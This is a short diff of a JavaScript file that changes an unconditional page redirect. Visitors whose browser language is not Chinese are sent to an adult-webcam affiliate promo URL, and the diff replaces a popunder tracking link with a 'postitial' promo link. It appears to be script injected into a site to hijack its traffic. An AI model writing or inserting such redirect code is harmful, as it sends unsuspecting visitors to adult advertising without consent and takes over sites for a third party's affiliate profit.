@@ -18,6 +18,6 @@ var lang = navigator.language || navigator.userLanguage;
 
 if(lang.substr(0, 3) == "zh-");
 else
-window.location.href = "https://bongacams7.com/track?c=708232&ps=mobile_popunder&csurl=httpss%3A%2F%2Fbngpt.com%2Fpromo.php%3Fc%3D708232%26type%3Dpopunder%26name%3Dmap%26ps%3Dmobile_popunder";
+window.location.href = "https://bngpst.com/promo.php?c=708232&type=postitial&p%5Bname%5D=base&p%5Bfrequency%5D=86400&p%5Bautoclose%5D=0&p%5Bpreview%5D=1&p%5Bframe%5D=1&p%5Bstandalone%5D=1";
 
 }
